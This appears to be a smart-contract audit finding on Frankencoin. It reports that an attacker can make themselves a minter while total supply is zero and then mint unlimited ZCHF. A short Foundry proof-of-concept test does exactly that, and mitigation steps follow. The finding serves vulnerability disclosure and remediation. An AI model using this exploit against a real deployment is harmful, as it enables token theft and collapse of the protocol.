# Lines of code

https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L84
https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L85


# Vulnerability details

## Impact

An attacker can become a minter, minting as many ZCHF tokens as they want, and consequently rendering the protocol meaningless.

## Proof of Concept

### direct link github

[https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L83](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L83)

### PoC

```jsx
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../contracts/test/Strings.sol";
import "../contracts/test/TestToken.sol";
import "../contracts/IERC20.sol";
import "../contracts/Equity.sol";
import "../contracts/IReserve.sol";
import "../contracts/IFrankencoin.sol";
import "../contracts/Ownable.sol";
import "../contracts/Position.sol";
import "../contracts/IPosition.sol";
import "../contracts/MintingHub.sol";
import "../contracts/PositionFactory.sol";
import "../contracts/StablecoinBridge.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract GeneralTest is Test {
    IFrankencoin zchf;
    User alice;
    User bob;
    address junan;

    constructor(){
        zchf = Frankencoin(0x7a787023f6E18f979B143C79885323a24709B0d8);
        junan = address(0x1234);
    }
    function testTets() public {
        console.log("block number: ",block.number);
        
        vm.startPrank(junan);
        console.log("junan's token before mint:",zchf.balanceOf(junan));

        zchf.suggestMinter(junan, 0, 0, "");
        zchf.mint(junan, 999 ether, 0, 0);

        console.log("junan's token after mint:",zchf.balanceOf(junan));
        vm.stopPrank();
    }
}
```


## Tools Used

 Foundry forge

## Recommended Mitigation Steps

1. Use constructor and mint 1 or more token
2. [https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L85](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Frankencoin.sol#L85) change >  ⇒  ≥